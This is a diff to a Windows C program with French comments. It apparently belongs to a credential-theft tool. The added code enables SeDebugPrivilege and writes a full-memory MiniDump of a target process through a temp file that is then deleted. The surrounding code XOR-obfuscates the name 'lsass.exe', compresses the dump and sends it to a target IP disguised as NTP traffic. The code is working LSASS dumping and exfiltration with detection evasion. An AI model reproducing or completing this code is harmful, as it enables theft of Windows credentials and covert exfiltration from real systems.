@@ -14,6 +14,39 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "DbgHelp.lib")
 
+
+// --- Activation du privilège SeDebugPrivilege ---
+BOOL EnableDebugPrivilege(void) {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        printf("[!] OpenProcessToken a échoué.\n");
+        return FALSE;
+    }
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+        printf("[!] LookupPrivilegeValue a échoué.\n");
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
+        printf("[!] AdjustTokenPrivileges a échoué.\n");
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+        printf("[!] Le token ne possède pas le privilège requis.\n");
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    CloseHandle(hToken);
+    return TRUE;
+}
+
 // --- Fonction de conversion ---
 // --- Convertit une chaîne de caractères ANSI (char*) en Unicode (wchar_t*). ---
 wchar_t* ConvertToWideChar(const char* charStr) {
@@ -95,65 +128,81 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
         return FALSE;
     }
 
-    // Chargement des fonctions kernel32.dll en mode indirect
-    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
-    if (!hKernel32) {
-        FreeLibrary(hDbgHelp);
-        return FALSE;
-    }
-    typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
-    typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
-    typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
-    typedef BOOL (WINAPI *pUnmapViewOfFile)(LPCVOID);
-    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
-
-    pOpenProcess fOpenProcess = (pOpenProcess)GetProcAddress(hKernel32, "OpenProcess");
-    pCreateFileMappingW fCreateFileMappingW = (pCreateFileMappingW)GetProcAddress(hKernel32, "CreateFileMappingW");
-    pMapViewOfFile fMapViewOfFile = (pMapViewOfFile)GetProcAddress(hKernel32, "MapViewOfFile");
-    pUnmapViewOfFile fUnmapViewOfFile = (pUnmapViewOfFile)GetProcAddress(hKernel32, "UnmapViewOfFile");
-    pCloseHandle fCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
-
-    if (!fOpenProcess || !fCreateFileMappingW || !fMapViewOfFile || !fUnmapViewOfFile || !fCloseHandle) {
-        FreeLibrary(hDbgHelp);
-        return FALSE;
-    }
-
-    HANDLE hProcess = fOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    // Ouvre le processus cible
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
     if (!hProcess) {
         FreeLibrary(hDbgHelp);
         return FALSE;
     }
 
-    size_t bufferSize = 0x1000000; // 16 MB
-    HANDLE hMapping = fCreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, (DWORD)bufferSize, NULL);
-    if (!hMapping) {
-        fCloseHandle(hProcess);
+    // Création d'un fichier temporaire pour stocker le dump
+    char tempPath[MAX_PATH];
+    if (!GetTempPathA(MAX_PATH, tempPath)) {
+        CloseHandle(hProcess);
         FreeLibrary(hDbgHelp);
         return FALSE;
     }
-    void* buffer = fMapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, bufferSize);
-    if (!buffer) {
-        fCloseHandle(hMapping);
-        fCloseHandle(hProcess);
+    char tempFile[MAX_PATH];
+    sprintf(tempFile, "%s\\dumpfile_%u.dmp", tempPath, GetCurrentProcessId());
+    HANDLE hFile = CreateFileA(tempFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        CloseHandle(hProcess);
         FreeLibrary(hDbgHelp);
         return FALSE;
     }
-    BOOL success = MiniDumpWriteDumpFunc(hProcess, pid, hMapping, MiniDumpWithFullMemory, NULL, NULL, NULL);
-    if (success) {
-        *dumpBuffer = (char*)malloc(bufferSize);
-        if (*dumpBuffer) {
-            memcpy(*dumpBuffer, buffer, bufferSize);
-            *dumpSize = bufferSize;
-        } else {
-            success = FALSE;
-        }
+
+    // Écriture du dump dans le fichier temporaire
+    BOOL success = MiniDumpWriteDumpFunc(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+    if (!success) {
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        FreeLibrary(hDbgHelp);
+        DeleteFileA(tempFile);
+        return FALSE;
     }
-    fUnmapViewOfFile(buffer);
-    fCloseHandle(hMapping);
-    fCloseHandle(hProcess);
+
+    // Récupération de la taille réelle du dump
+    LARGE_INTEGER liSize;
+    if (!GetFileSizeEx(hFile, &liSize)) {
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        FreeLibrary(hDbgHelp);
+        DeleteFileA(tempFile);
+        return FALSE;
+    }
+    *dumpSize = (size_t)liSize.QuadPart;
+
+    // Allocation d'un buffer de la taille réelle du dump
+    *dumpBuffer = (char*)malloc(*dumpSize);
+    if (!*dumpBuffer) {
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        FreeLibrary(hDbgHelp);
+        DeleteFileA(tempFile);
+        return FALSE;
+    }
+
+    // Remise du pointeur de fichier au début et lecture du dump dans le buffer
+    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+    DWORD bytesRead = 0;
+    if (!ReadFile(hFile, *dumpBuffer, (DWORD)*dumpSize, &bytesRead, NULL) || bytesRead != *dumpSize) {
+        free(*dumpBuffer);
+        *dumpBuffer = NULL;
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        FreeLibrary(hDbgHelp);
+        DeleteFileA(tempFile);
+        return FALSE;
+    }
+
+    // Nettoyage
+    CloseHandle(hFile);
+    CloseHandle(hProcess);
     FreeLibrary(hDbgHelp);
-    return success;
+    DeleteFileA(tempFile);
+    return TRUE;
 }
+
 
 // --- Fonction de compression ---
 // Compresse le buffer à l'aide de zlib (ici, l'appel reste direct car zlib n'est pas une API Windows)
@@ -271,6 +320,13 @@ int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *
 }
 
 int main(void) {
+
+    // Activation de SeDebugPrivilege
+    if (!EnableDebugPrivilege()) {
+        printf("[!] Activation of SeDebugPrivilege failed.\n");
+        return 1;
+    }
+    
     // Obfuscation de "lsass.exe" (chaque caractère XOR avec 0x13)
     wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13,
                                   's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13,
